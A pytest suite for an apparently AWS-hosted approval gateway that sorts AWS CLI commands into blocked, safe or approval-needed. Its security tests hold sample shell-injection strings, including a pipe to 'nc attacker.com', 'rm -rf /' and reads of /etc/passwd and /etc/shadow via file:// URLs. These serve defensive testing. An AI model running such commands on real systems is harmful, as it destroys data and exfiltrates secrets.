"""
Bouncer v2.0.0 測試
包含 MCP JSON-RPC 測試 + 原有 REST API 測試
"""

import json
import sys
import os
import time
import pytest
from unittest.mock import patch, MagicMock
from decimal import Decimal

# Moto for AWS mocking
from moto import mock_aws
import boto3


# ============================================================================
# Fixtures
# ============================================================================

@pytest.fixture
def mock_dynamodb():
    """建立 mock DynamoDB 表（含 GSI）"""
    with mock_aws():
        dynamodb = boto3.resource('dynamodb', region_name='us-east-1')
        table = dynamodb.create_table(
            TableName='clawdbot-approval-requests',
            KeySchema=[{'AttributeName': 'request_id', 'KeyType': 'HASH'}],
            AttributeDefinitions=[
                {'AttributeName': 'request_id', 'AttributeType': 'S'},
                {'AttributeName': 'status', 'AttributeType': 'S'},
                {'AttributeName': 'created_at', 'AttributeType': 'N'},
                {'AttributeName': 'source', 'AttributeType': 'S'},
            ],
            GlobalSecondaryIndexes=[
                {
                    'IndexName': 'status-created-index',
                    'KeySchema': [
                        {'AttributeName': 'status', 'KeyType': 'HASH'},
                        {'AttributeName': 'created_at', 'KeyType': 'RANGE'}
                    ],
                    'Projection': {'ProjectionType': 'ALL'}
                },
                {
                    'IndexName': 'source-created-index',
                    'KeySchema': [
                        {'AttributeName': 'source', 'KeyType': 'HASH'},
                        {'AttributeName': 'created_at', 'KeyType': 'RANGE'}
                    ],
                    'Projection': {'ProjectionType': 'ALL'}
                }
            ],
            BillingMode='PAY_PER_REQUEST'
        )
        table.wait_until_exists()
        yield dynamodb


@pytest.fixture
def app_module(mock_dynamodb):
    """載入 app 模組並注入 mock"""
    # 設定環境變數
    os.environ['AWS_DEFAULT_REGION'] = 'us-east-1'
    os.environ['DEFAULT_ACCOUNT_ID'] = '111111111111'
    os.environ['TABLE_NAME'] = 'clawdbot-approval-requests'
    os.environ['REQUEST_SECRET'] = 'test-secret'
    os.environ['TELEGRAM_BOT_TOKEN'] = 'test-token'
    os.environ['APPROVED_CHAT_ID'] = '999999999'
    os.environ['MCP_MAX_WAIT'] = '5'  # 測試用短時間
    
    # 重新載入模組（包括新模組）
    for mod in ['app', 'telegram', 'paging', 'trust', 'commands', 'notifications', 'db',
                'callbacks', 'mcp_tools', 'mcp_execute', 'mcp_upload', 'mcp_admin',
                'accounts', 'rate_limit', 'smart_approval',
                'src.app', 'src.telegram', 'src.paging', 'src.trust', 'src.commands']:
        if mod in sys.modules:
            del sys.modules[mod]
    
    sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
    import app
    
    # 注入 mock table
    import db
    app.table = mock_dynamodb.Table('clawdbot-approval-requests')
    app.dynamodb = mock_dynamodb
    db.table = app.table
    db.accounts_table = app.accounts_table if hasattr(app, 'accounts_table') else mock_dynamodb.Table('bouncer-accounts')
    
    yield app
    
    sys.path.pop(0)


# ============================================================================
# MCP Tests
# ============================================================================

class TestMCPInitialize:
    """MCP initialize 方法測試"""
    
    def test_initialize_success(self, app_module):
        """測試 MCP initialize"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 1,
                'method': 'initialize',
                'params': {}
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        
        body = json.loads(result['body'])
        assert body['jsonrpc'] == '2.0'
        assert body['id'] == 1
        assert 'result' in body
        assert body['result']['serverInfo']['name'] == 'bouncer'
        assert body['result']['protocolVersion'] == '2024-11-05'


class TestMCPToolsList:
    """MCP tools/list 方法測試"""
    
    def test_tools_list(self, app_module):
        """測試列出所有工具"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 2,
                'method': 'tools/list',
                'params': {}
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        assert 'result' in body
        tools = body['result']['tools']
        tool_names = [t['name'] for t in tools]
        
        assert 'bouncer_execute' in tool_names
        assert 'bouncer_status' in tool_names
        assert 'bouncer_list_safelist' in tool_names


class TestMCPExecuteSafelist:
    """MCP bouncer_execute SAFELIST 測試"""
    
    def test_execute_safelist_command(self, app_module):
        """測試自動批准的命令"""
        import mcp_execute
        import mcp_tools
        # 需要 mock mcp_tools.execute_command
        with patch.object(mcp_execute, 'execute_command', return_value='{"Reservations": []}'):
            event = {
                'rawPath': '/mcp',
                'headers': {'x-approval-secret': 'test-secret'},
                'body': json.dumps({
                    'jsonrpc': '2.0',
                    'id': 3,
                    'method': 'tools/call',
                    'params': {
                        'name': 'bouncer_execute',
                        'arguments': {
                            'command': 'aws ec2 describe-instances',
                            'trust_scope': 'test-session',
                        }
                    }
                }),
                'requestContext': {'http': {'method': 'POST'}}
            }
            
            result = app_module.lambda_handler(event, None)
            body = json.loads(result['body'])
            
            assert 'result' in body
            content = json.loads(body['result']['content'][0]['text'])
            assert content['status'] == 'auto_approved'
            assert '{"Reservations": []}' in content['result']


class TestMCPExecuteBlocked:
    """MCP bouncer_execute BLOCKED 測試"""
    
    def test_execute_blocked_command(self, app_module):
        """測試被封鎖的命令"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 4,
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_execute',
                    'arguments': {
                        'command': 'aws iam create-user --user-name hacker',
                        'trust_scope': 'test-session',
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        assert 'result' in body
        assert body['result']['isError'] == True
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'blocked'


class TestMCPExecuteApproval:
    """MCP bouncer_execute APPROVAL 測試"""
    
    @patch('telegram.send_telegram_message')
    def test_execute_needs_approval_async(self, mock_telegram, app_module):
        """測試需要審批的命令（預設異步，立即返回 pending_approval）"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 5,
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_execute',
                    'arguments': {
                        'command': 'aws ec2 start-instances --instance-ids i-123',
                        'trust_scope': 'test-session',
                        'reason': 'Test start'
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        # 預設異步：立即返回 pending_approval
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'pending_approval'
        assert 'request_id' in content
        assert mock_telegram.called
    
    @patch('telegram.send_telegram_message')
    def test_execute_approved(self, mock_telegram, app_module):
        """測試審批通過的命令"""
        
        # 先建立 pending 請求
        request_id = 'test123'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'command': 'aws ec2 start-instances --instance-ids i-123',
            'status': 'approved',
            'result': 'Instance started',
            'approver': '999999999'
        })
        
        # 查詢狀態
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 6,
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_status',
                    'arguments': {
                        'request_id': request_id
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'approved'
        assert content['result'] == 'Instance started'


class TestMCPListSafelist:
    """MCP bouncer_list_safelist 測試"""
    
    def test_list_safelist(self, app_module):
        """測試列出 safelist"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 7,
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_list_safelist',
                    'arguments': {}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        content = json.loads(body['result']['content'][0]['text'])
        assert 'safelist_prefixes' in content
        assert 'blocked_patterns' in content
        assert 'aws ec2 describe-' in content['safelist_prefixes']


class TestMCPErrors:
    """MCP 錯誤處理測試"""
    
    def test_invalid_secret(self, app_module):
        """測試無效的 secret"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'wrong-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 1,
                'method': 'initialize'
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        assert 'error' in body
        assert body['error']['code'] == -32600
    
    def test_invalid_jsonrpc_version(self, app_module):
        """測試無效的 jsonrpc 版本"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '1.0',
                'id': 1,
                'method': 'initialize'
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        assert 'error' in body
        assert 'jsonrpc must be "2.0"' in body['error']['message']
    
    def test_unknown_method(self, app_module):
        """測試未知方法"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 1,
                'method': 'unknown_method'
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        assert 'error' in body
        assert body['error']['code'] == -32601
    
    def test_unknown_tool(self, app_module):
        """測試未知工具"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 1,
                'method': 'tools/call',
                'params': {
                    'name': 'unknown_tool',
                    'arguments': {}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        assert 'error' in body
        assert body['error']['code'] == -32602


# ============================================================================
# REST API Tests（向後兼容）
# ============================================================================

class TestRESTSafelist:
    """REST API SAFELIST 測試"""
    
    @patch('commands.execute_command')
    def test_safelist_auto_approved(self, mock_execute, app_module):
        """測試 REST API 自動批准"""
        mock_execute.return_value = '{"Account": "123456"}'
        
        event = {
            'rawPath': '/',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'command': 'aws sts get-caller-identity'
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        
        body = json.loads(result['body'])
        assert body['status'] == 'auto_approved'


class TestRESTBlocked:
    """REST API BLOCKED 測試"""
    
    def test_blocked_command(self, app_module):
        """測試 REST API 封鎖命令"""
        event = {
            'rawPath': '/',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'command': 'aws iam delete-user --user-name admin'
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 403
        
        body = json.loads(result['body'])
        assert body['status'] == 'blocked'


class TestRESTApproval:
    """REST API APPROVAL 測試"""
    
    @patch('telegram.send_telegram_message')
    def test_approval_pending(self, mock_telegram, app_module):
        """測試 REST API 待審批（非等待模式）"""
        event = {
            'rawPath': '/',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'command': 'aws ec2 stop-instances --instance-ids i-123',
                'wait': False
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 202
        
        body = json.loads(result['body'])
        assert body['status'] == 'pending_approval'
        assert 'request_id' in body
        assert mock_telegram.called


# ============================================================================
# Telegram Webhook Tests
# ============================================================================

class TestTelegramWebhook:
    """Telegram Webhook 測試"""
    
    @patch('app.update_message')
    @patch('app.answer_callback')
    @patch('callbacks.execute_command')
    def test_approve_callback(self, mock_execute, mock_answer, mock_update, app_module):
        """測試審批通過 callback"""
        mock_execute.return_value = 'Done'
        
        # 建立 pending 請求
        request_id = 'webhook_test'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'command': 'aws ec2 start-instances --instance-ids i-123',
            'status': 'pending_approval',
            'created_at': int(time.time())
        })
        
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb123',
                    'from': {'id': 999999999},
                    'data': f'approve:{request_id}',
                    'message': {'message_id': 999}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        
        # 驗證狀態更新
        item = app_module.table.get_item(Key={'request_id': request_id})['Item']
        assert item['status'] == 'approved'
        assert 'result' in item
    
    @patch('app.update_message')
    @patch('app.answer_callback')
    def test_deny_callback(self, mock_answer, mock_update, app_module):
        """測試拒絕 callback"""
        request_id = 'deny_test'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'command': 'aws ec2 terminate-instances --instance-ids i-123',
            'status': 'pending_approval',
            'created_at': int(time.time())
        })
        
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb456',
                    'from': {'id': 999999999},
                    'data': f'deny:{request_id}',
                    'message': {'message_id': 888}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        
        item = app_module.table.get_item(Key={'request_id': request_id})['Item']
        assert item['status'] == 'denied'
    
    @patch('app.answer_callback')
    def test_unauthorized_user(self, mock_answer, app_module):
        """測試未授權用戶"""
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb789',
                    'from': {'id': 999999},  # 未授權
                    'data': 'approve:test123',
                    'message': {'message_id': 777}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 403


# ============================================================================
# Command Classification Tests
# ============================================================================

class TestCommandClassification:
    """命令分類測試"""
    
    def test_is_blocked(self, app_module):
        """測試 BLOCKED 分類"""
        assert app_module.is_blocked('aws iam create-user --user-name test')
        assert app_module.is_blocked('aws iam delete-role --role-name admin')
        assert app_module.is_blocked('aws sts assume-role --role-arn xxx')
        # Shell metacharacters are NOT checked by is_blocked — they are handled
        # by execute_command's aws_cli_split which doesn't invoke a shell
        assert not app_module.is_blocked('aws ec2 describe-instances; rm -rf /')
        assert not app_module.is_blocked('aws s3 ls | cat /etc/passwd')
        assert not app_module.is_blocked('aws lambda invoke $(whoami)')
    
    def test_is_auto_approve(self, app_module):
        """測試 SAFELIST 分類"""
        assert app_module.is_auto_approve('aws ec2 describe-instances')
        assert app_module.is_auto_approve('aws s3 ls')
        assert app_module.is_auto_approve('aws sts get-caller-identity')
        assert app_module.is_auto_approve('aws rds describe-db-instances')
        assert app_module.is_auto_approve('aws logs filter-log-events --log-group xxx')
    
    def test_approval_required(self, app_module):
        """測試需要審批的命令"""
        # 這些不在 blocked 也不在 safelist
        assert not app_module.is_blocked('aws ec2 start-instances --instance-ids i-123')
        assert not app_module.is_auto_approve('aws ec2 start-instances --instance-ids i-123')
        
        assert not app_module.is_blocked('aws s3 rm s3://bucket/file')
        assert not app_module.is_auto_approve('aws s3 rm s3://bucket/file')


# ============================================================================
# Security Tests
# ============================================================================

class TestSecurity:
    """安全測試"""

    def test_shell_injection_not_executed(self, app_module):
        """測試 shell injection 不會被執行（execute_command 層面）"""
        # 注意：is_blocked 只檢查命令黑名單
        # shell injection 防護在 execute_command 中用 aws_cli_split（不走 shell）
        injections = [
            'aws s3 ls; cat /etc/passwd',
            'aws ec2 describe-instances | nc attacker.com 1234',
            'aws lambda invoke && rm -rf /',
        ]

        for cmd in injections:
            # 這些命令會在 execute_command 執行時被安全處理
            # aws_cli_split 會把 ; | && 等當作普通字元，不是 shell 操作符
            pass  # shell injection 防護測試在 test_execute_only_aws_commands
    
    def test_execute_only_aws_commands(self, app_module):
        """測試只能執行 aws 命令"""
        result = app_module.execute_command('ls -la')
        assert '只能執行 aws CLI 命令' in result
        
        result = app_module.execute_command('cat /etc/passwd')
        assert '只能執行 aws CLI 命令' in result


class TestSecurityWhitespaceBypass:
    """測試空白繞過防護"""

    def test_double_space_blocked(self, app_module):
        """雙空格不能繞過 is_blocked"""
        # 正常應該被 block
        assert app_module.is_blocked('aws iam create-user --user-name hacker')
        # 雙空格繞過嘗試
        assert app_module.is_blocked('aws iam  create-user --user-name hacker')
        assert app_module.is_blocked('aws  iam  create-user --user-name hacker')

    def test_tab_blocked(self, app_module):
        """Tab 字元不能繞過 is_blocked"""
        assert app_module.is_blocked('aws iam\tcreate-user --user-name hacker')
        assert app_module.is_blocked('aws\tiam\tcreate-user')

    def test_newline_blocked(self, app_module):
        """換行字元不能繞過 is_blocked"""
        assert app_module.is_blocked('aws iam\ncreate-user --user-name hacker')

    def test_multiple_spaces_dangerous(self, app_module):
        """雙空格不能繞過 is_dangerous"""
        assert app_module.is_dangerous('aws s3  rb s3://bucket')
        assert app_module.is_dangerous('aws  ec2  terminate-instances --instance-ids i-123')

    def test_multiple_spaces_auto_approve(self, app_module):
        """多空格後 auto_approve prefix 仍然匹配"""
        assert app_module.is_auto_approve('aws  s3  ls')
        assert app_module.is_auto_approve('aws  ec2  describe-instances')

    def test_leading_trailing_spaces(self, app_module):
        """前後空白不影響分類"""
        assert app_module.is_blocked('  aws iam create-user  ')
        assert app_module.is_auto_approve('  aws s3 ls  ')


class TestSecurityBlockedFlags:
    """測試危險旗標阻擋"""

    def test_endpoint_url_blocked(self, app_module):
        """--endpoint-url 被阻擋（防止重定向到惡意服務器）"""
        assert app_module.is_blocked('aws s3 ls --endpoint-url https://evil.com')
        assert app_module.is_blocked('aws ec2 describe-instances --endpoint-url http://attacker.internal')

    def test_profile_blocked(self, app_module):
        """--profile 被阻擋（防止切換到未授權 profile）"""
        assert app_module.is_blocked('aws s3 ls --profile attacker')

    def test_no_verify_ssl_blocked(self, app_module):
        """--no-verify-ssl 被阻擋（防止 MITM）"""
        assert app_module.is_blocked('aws s3 ls --no-verify-ssl')

    def test_ca_bundle_blocked(self, app_module):
        """--ca-bundle 被阻擋（防止使用惡意 CA）"""
        assert app_module.is_blocked('aws s3 ls --ca-bundle /tmp/evil-ca.pem')

    def test_debug_not_blocked(self, app_module):
        """--debug 不阻擋（洩漏風險較低，且有合法用途）"""
        # debug 可能洩漏 credentials，但阻擋會影響正常除錯
        # 目前不阻擋，可以之後加入 DANGEROUS_PATTERNS
        assert not app_module.is_blocked('aws s3 ls --debug')

    def test_normal_flags_not_blocked(self, app_module):
        """正常旗標不受影響"""
        assert not app_module.is_blocked('aws s3 ls --recursive')
        assert not app_module.is_blocked('aws ec2 describe-instances --output json')
        assert not app_module.is_blocked('aws ec2 describe-instances --no-paginate')


class TestSecurityFileProtocol:
    """測試 file:// 協議阻擋"""

    def test_file_protocol_blocked(self, app_module):
        """file:// 被阻擋（防止讀取本地檔案）"""
        assert app_module.is_blocked('aws ec2 run-instances --cli-input-json file:///etc/passwd')
        assert app_module.is_blocked('aws lambda invoke --payload file:///etc/shadow output.json')

    def test_fileb_protocol_blocked(self, app_module):
        """fileb:// 被阻擋（防止上傳本地二進位檔案）"""
        assert app_module.is_blocked('aws s3api put-object --body fileb:///etc/shadow --bucket x --key y')
        assert app_module.is_blocked('aws lambda invoke --payload fileb:///proc/self/environ output.json')

    def test_file_in_value_not_false_positive(self, app_module):
        """file 在普通值中不會誤判"""
        # "file" 作為普通字串不應觸發（沒有 ://）
        assert not app_module.is_blocked('aws s3 ls s3://bucket/file.txt')
        assert not app_module.is_blocked('aws s3 cp file.txt s3://bucket/')


# ============================================================================
# Integration Tests
# ============================================================================

class TestIntegration:
    """整合測試"""
    
    def test_full_mcp_flow_safelist(self, app_module):
        """測試完整 MCP 流程（SAFELIST）"""
        import mcp_execute
        import mcp_tools
        with patch.object(mcp_execute, 'execute_command', return_value='{"UserId": "123", "Account": "456", "Arn": "arn:aws:iam::456:user/test"}'):
            # Initialize
            init_event = {
                'rawPath': '/mcp',
                'headers': {'x-approval-secret': 'test-secret'},
                'body': json.dumps({
                    'jsonrpc': '2.0',
                    'id': 1,
                    'method': 'initialize',
                    'params': {}
                }),
                'requestContext': {'http': {'method': 'POST'}}
            }
            result = app_module.lambda_handler(init_event, None)
            assert result['statusCode'] == 200
            
            # Execute
            exec_event = {
                'rawPath': '/mcp',
                'headers': {'x-approval-secret': 'test-secret'},
                'body': json.dumps({
                    'jsonrpc': '2.0',
                    'id': 2,
                    'method': 'tools/call',
                    'params': {
                        'name': 'bouncer_execute',
                        'arguments': {
                            'command': 'aws sts get-caller-identity',
                            'trust_scope': 'test-session',
                        }
                    }
                }),
                'requestContext': {'http': {'method': 'POST'}}
            }
            result = app_module.lambda_handler(exec_event, None)
            body = json.loads(result['body'])
            
            content = json.loads(body['result']['content'][0]['text'])
            assert content['status'] == 'auto_approved'
            assert 'UserId' in content['result']


# ============================================================================
# Status Query Tests
# ============================================================================

class TestStatusQuery:
    """狀態查詢測試"""
    
    def test_status_query_found(self, app_module):
        """測試查詢存在的請求"""
        request_id = 'status_test'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'command': 'aws ec2 describe-instances',
            'status': 'approved',
            'result': 'OK'
        })
        
        event = {
            'rawPath': f'/status/{request_id}',
            'headers': {'x-approval-secret': 'test-secret'},
            'requestContext': {'http': {'method': 'GET'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        
        body = json.loads(result['body'])
        assert body['status'] == 'approved'
    
    def test_status_query_not_found(self, app_module):
        """測試查詢不存在的請求"""
        event = {
            'rawPath': '/status/nonexistent',
            'headers': {'x-approval-secret': 'test-secret'},
            'requestContext': {'http': {'method': 'GET'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 404


# ============================================================================
# Trust Session 測試
# ============================================================================

class TestTrustSession:
    """Trust Session 測試"""
    
    def test_should_trust_approve_no_session(self, app_module):
        """沒有 Trust Session 時應該返回 False"""
        should_trust, session, reason = app_module.should_trust_approve(
            'aws ec2 describe-instances',
            'test-source',
            '111111111111'
        )
        assert should_trust is False
        assert session is None
    
    def test_trust_excluded_services(self, app_module):
        """高危服務應該被排除"""
        # IAM 命令不應該被信任
        assert app_module.is_trust_excluded('aws iam list-users') is True
        assert app_module.is_trust_excluded('aws sts get-caller-identity') is True
        assert app_module.is_trust_excluded('aws kms list-keys') is True
        
        # 安全命令可以被信任
        assert app_module.is_trust_excluded('aws ec2 describe-instances') is False
        assert app_module.is_trust_excluded('aws s3 ls') is False
    
    def test_trust_excluded_actions(self, app_module):
        """高危操作應該被排除"""
        # 刪除操作
        assert app_module.is_trust_excluded('aws ec2 delete-vpc --vpc-id vpc-123') is True
        assert app_module.is_trust_excluded('aws s3 rm s3://bucket/key') is True
        
        # 終止操作
        assert app_module.is_trust_excluded('aws ec2 terminate-instances --instance-ids i-123') is True
        
        # 停止操作
        assert app_module.is_trust_excluded('aws ec2 stop-instances --instance-ids i-123') is True
    
    def test_trust_excluded_flags(self, app_module):
        """危險旗標應該被排除"""
        # --force
        assert app_module.is_trust_excluded('aws s3 rm s3://bucket --force') is True
        
        # --recursive
        assert app_module.is_trust_excluded('aws s3 rm s3://bucket --recursive') is True
        
        # --skip-final-snapshot
        assert app_module.is_trust_excluded('aws rds delete-db-instance --skip-final-snapshot') is True
        
        # 安全命令
        assert app_module.is_trust_excluded('aws s3 ls s3://bucket') is False


# ============================================================================
# Rate Limiting 測試
# ============================================================================

class TestRateLimiting:
    """Rate Limiting 測試"""
    
    def test_rate_limit_not_exceeded(self, app_module):
        """正常請求不應該觸發 rate limit"""
        # 第一次請求應該通過
        try:
            app_module.check_rate_limit('test-source-1')
        except (app_module.RateLimitExceeded, app_module.PendingLimitExceeded):
            pytest.fail("Rate limit should not be exceeded on first request")

    def test_rate_limit_disabled(self, app_module):
        """停用 rate limit 時應該跳過檢查"""
        with patch('rate_limit.RATE_LIMIT_ENABLED', False):
            # 即使呼叫多次也不應該觸發
            for _ in range(20):
                app_module.check_rate_limit('test-source-2')


# ============================================================================
# Output Paging 測試
# ============================================================================

class TestOutputPaging:
    """Output Paging 測試"""
    
    def test_short_output_not_paged(self, app_module):
        """短輸出不應該分頁"""
        result = app_module.store_paged_output('req-123', 'short output')
        assert result['paged'] is False
        assert result['result'] == 'short output'
    
    def test_long_output_is_paged(self, app_module):
        """長輸出應該分頁"""
        long_output = 'x' * 5000  # 超過 OUTPUT_MAX_INLINE
        result = app_module.store_paged_output('req-456', long_output)
        
        assert result['paged'] is True
        assert result['page'] == 1
        assert result['total_pages'] == 2  # 5000 / 3000 = 2 頁
        assert result['output_length'] == 5000
        assert result['next_page'] == 'req-456:page:2'
        assert len(result['result']) == 3000  # 第一頁
    
    def test_get_paged_output(self, app_module):
        """測試取得分頁輸出"""
        # 先存一個長輸出
        long_output = 'A' * 3000 + 'B' * 3000  # 6000 字元，2 頁
        app_module.store_paged_output('req-789', long_output)
        
        # 取得第 2 頁
        result = app_module.get_paged_output('req-789:page:2')
        
        assert 'error' not in result
        assert result['page'] == 2
        assert result['total_pages'] == 2
        assert result['result'] == 'B' * 3000
        assert result['next_page'] is None  # 最後一頁
    
    def test_get_nonexistent_page(self, app_module):
        """測試取得不存在的分頁"""
        result = app_module.get_paged_output('nonexistent:page:99')
        assert 'error' in result


# ============================================================================
# 命令分類測試（補充）
# ============================================================================

class TestCommandClassificationExtended:
    """命令分類補充測試"""
    
    def test_blocked_iam_commands(self, app_module):
        """IAM 危險命令應該被阻擋"""
        blocked_commands = [
            'aws iam delete-user --user-name admin',
            'aws iam create-access-key --user-name admin',
            'aws iam attach-role-policy --role-name Admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess',
            'aws sts assume-role --role-arn arn:aws:iam::123:role/Admin',
        ]
        for cmd in blocked_commands:
            assert app_module.is_blocked(cmd) is True, f"Should block: {cmd}"
    
    def test_dangerous_commands(self, app_module):
        """高危命令應該被標記為 DANGEROUS（需特殊審批，但不是完全禁止）"""
        dangerous_commands = [
            'aws ec2 terminate-instances --instance-ids i-12345',
            'aws rds delete-db-instance --db-instance-identifier prod-db',
            'aws lambda delete-function --function-name important-func',
            'aws cloudformation delete-stack --stack-name prod-stack',
            'aws s3 rb s3://my-bucket',
            'aws s3api delete-bucket --bucket my-bucket',
        ]
        for cmd in dangerous_commands:
            assert app_module.is_dangerous(cmd) is True, f"Should be dangerous: {cmd}"
            # DANGEROUS 命令不應該被完全 block
            assert app_module.is_blocked(cmd) is False, f"Should NOT be blocked: {cmd}"
    
    def test_auto_approve_read_commands(self, app_module):
        """讀取命令應該自動批准"""
        auto_approve_commands = [
            'aws s3 ls',
            'aws ec2 describe-instances',
            'aws lambda list-functions',
            'aws dynamodb scan --table-name test',
            'aws logs get-log-events --log-group-name /aws/lambda/test',
        ]
        for cmd in auto_approve_commands:
            assert app_module.is_auto_approve(cmd) is True, f"Should auto-approve: {cmd}"
    
    def test_needs_approval_write_commands(self, app_module):
        """寫入命令應該需要審批"""
        need_approval_commands = [
            'aws ec2 run-instances --image-id ami-123',
            'aws s3 cp file.txt s3://bucket/',
            'aws lambda invoke --function-name test output.json',
            'aws dynamodb put-item --table-name test --item {}',
        ]
        for cmd in need_approval_commands:
            # 不被阻擋
            assert app_module.is_blocked(cmd) is False, f"Should not block: {cmd}"
            # 也不自動批准
            assert app_module.is_auto_approve(cmd) is False, f"Should not auto-approve: {cmd}"


# ============================================================================
# AWS CLI 命令解析測試
# ============================================================================

class TestAwsCliSplit:
    """測試 aws_cli_split — 取代 shlex.split + fix_json_args + fix_query_arg"""

    # --- 基本命令 ---

    def test_simple_command(self, app_module):
        assert app_module.aws_cli_split("aws s3 ls") == ["aws", "s3", "ls"]

    def test_with_parameter(self, app_module):
        assert app_module.aws_cli_split("aws ec2 describe-instances --instance-ids i-12345") == \
            ["aws", "ec2", "describe-instances", "--instance-ids", "i-12345"]

    def test_boolean_flag(self, app_module):
        assert app_module.aws_cli_split("aws s3 ls s3://bucket --recursive") == \
            ["aws", "s3", "ls", "s3://bucket", "--recursive"]

    def test_multiple_parameters(self, app_module):
        assert app_module.aws_cli_split("aws ec2 describe-instances --instance-ids i-123 --output json") == \
            ["aws", "ec2", "describe-instances", "--instance-ids", "i-123", "--output", "json"]

    def test_extra_spaces(self, app_module):
        assert app_module.aws_cli_split("aws  s3  ls   s3://bucket") == \
            ["aws", "s3", "ls", "s3://bucket"]

    # --- 引號字串 ---

    def test_double_quotes(self, app_module):
        result = app_module.aws_cli_split('aws sns publish --topic-arn X --message "Hello World"')
        assert result == ["aws", "sns", "publish", "--topic-arn", "X", "--message", "Hello World"]

    def test_single_quotes(self, app_module):
        result = app_module.aws_cli_split("aws sns publish --topic-arn X --message 'Hello World'")
        assert result == ["aws", "sns", "publish", "--topic-arn", "X", "--message", "Hello World"]

    def test_escaped_quotes(self, app_module):
        result = app_module.aws_cli_split(r'aws sns publish --message "He said \"hi\""')
        assert result == ["aws", "sns", "publish", "--message", 'He said "hi"']

    def test_empty_quotes(self, app_module):
        result = app_module.aws_cli_split('aws sns publish --message ""')
        assert result == ["aws", "sns", "publish", "--message", ""]

    # --- JSON 參數 ---

    def test_simple_json(self, app_module):
        result = app_module.aws_cli_split(
            'aws secretsmanager create-secret --name test --generate-secret-string {"PasswordLength":32}')
        idx = result.index('--generate-secret-string') + 1
        assert result[idx] == '{"PasswordLength":32}'

    def test_json_with_space_values(self, app_module):
        result = app_module.aws_cli_split(
